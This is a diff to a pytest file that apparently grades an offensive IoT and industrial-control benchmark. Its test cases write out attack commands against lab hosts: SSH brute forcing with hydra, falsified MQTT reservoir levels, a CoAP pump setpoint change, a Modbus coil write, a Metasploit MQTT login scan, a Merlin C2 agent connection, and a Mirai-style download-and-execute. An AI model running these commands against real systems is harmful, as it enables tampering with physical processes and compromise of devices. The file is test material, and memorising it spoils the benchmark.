@@ -47,7 +47,14 @@ def assess(tmp_path):
     return run
 
 
-@pytest.mark.parametrize("task_id", SOLUTIONS)
+@pytest.mark.parametrize(
+    "task_id",
+    [
+        "mqtt-falsify-level",
+        "merlin-agent-connect",
+    ],
+    ids=["mqtt-falsify-level", "merlin-agent-connect"],
+)
 def test_observed_action_destination_and_stage_receive_full_credit(assess, task_id):
     result = assess(task_id, SOLUTIONS[task_id])
     assert result.outcome == "Full", result.to_dict()
@@ -123,8 +130,6 @@ def test_reduced_offensive_stage_is_limited(assess, task_id, source):
             "merlin-agent-connect",
             "./merlinAgent-Linux-x64 -url https://192.168.1.26:443 -sleep 20s",
         ),
-        ("merlin-c2-task", "chmod 775 /opt/hping3"),
-        ("merlin-c2-task", "shell chmod 666 /opt/hping3"),
         (
             "mirai-telnet-install",
             "wget -O /tmp/gateway-agent.bin http://192.168.1.28/gateway-agent.bin "
@@ -135,6 +140,17 @@ def test_reduced_offensive_stage_is_limited(assess, task_id, source):
             "wget -O /tmp/gateway-agent.bin http://192.168.1.28/gateway-agent.bin "
             "&& chmod 001 /tmp/gateway-agent.bin && /tmp/gateway-agent.bin",
         ),
+    ],
+    ids=[
+        "nmap-telnet-credentials-hydra -l root -P candidates.txt 192.168.1.29 ssh",
+        "mqtt-falsify-level-mosquitto_pub -h 192.168.1.22 -t plant/reservoir/level -m '{\"level_m\":0.2}' -r",
+        "coap-change-setpoint-coap-client -m get -e '{\"setpoint\":80}' coap://192.168.1.23/actuators/pump/setpoint",
+        "plc-policy-coil-write-mbpoll -p1502 -a1 -0 -r17 -t0 192.168.1.24 0",
+        "metasploit-mqtt-scan-msfconsole -x 'use auxiliary/scanner/mqtt/connect; set RHOSTS 192.168.1.25; set RPORT 1883; set USERNAME admin; set PASS_FILE candidates.txt; run'",
+        "metasploit-mqtt-scan-msfconsole -x 'use auxiliary/scanner/mqtt/connect; set RHOSTS 192.168.1.25; set RPORT 1883; set USERNAME admin; set PASS_FILE candidates.txt; run; exit -n'",
+        "merlin-agent-connect-./merlinAgent-Linux-x64 -url https://192.168.1.26:443 -sleep 20s",
+        "mirai-telnet-install-wget -O /tmp/gateway-agent.bin http://192.168.1.28/gateway-agent.bin && chmod 775 /tmp/gateway-agent.bin && /tmp/other",
+        "mirai-telnet-install-wget -O /tmp/gateway-agent.bin http://192.168.1.28/gateway-agent.bin && chmod 001 /tmp/gateway-agent.bin && /tmp/gateway-agent.bin",
     ],
 )
 def test_wrong_action_target_or_required_stage_fails(assess, task_id, source):
